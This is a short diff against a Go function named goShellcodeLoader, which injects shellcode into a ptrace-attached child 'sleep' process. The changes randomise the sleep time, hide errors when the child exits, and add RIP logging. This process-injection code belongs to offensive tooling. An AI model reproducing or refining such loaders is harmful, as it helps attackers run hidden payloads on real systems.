@@ -112,7 +112,8 @@ func goShellcodeLoader(shellcode *string) error {
 	}
 
 	// start a child process to inject shellcode into
-	child := exec.Command("sleep", "5")
+	sec := strconv.Itoa(RandInt(10, 30))
+	child := exec.Command("sleep", sec)
 	child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
 	err = child.Start()
 	if err != nil {
@@ -161,6 +162,7 @@ func goShellcodeLoader(shellcode *string) error {
 	if err != nil {
 		return fmt.Errorf("continue: wait4: %v", err)
 	}
+	// what happened to our child?
 	switch {
 	case ws.Continued():
 		return nil
@@ -171,7 +173,7 @@ func goShellcodeLoader(shellcode *string) error {
 		}
 		return fmt.Errorf("continue: core dumped: RIP at 0x%x", regs.Rip)
 	case ws.Exited():
-		return fmt.Errorf("continue: exited (%d)", ws.ExitStatus())
+		return nil
 	case ws.Signaled():
 		err = syscall.PtraceGetRegs(childPid, regs)
 		if err != nil {
@@ -189,13 +191,9 @@ func goShellcodeLoader(shellcode *string) error {
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", childPid, err)
 		}
+		log.Printf("continue: RIP at 0x%x", regs.Rip)
 	}
 
-	// detach and let it run
-	// err = syscall.PtraceDetach(childPid)
-	// if err != nil {
-	// 	return fmt.Errorf("detach: %v", err)
-	// }
 	return nil
 }
 
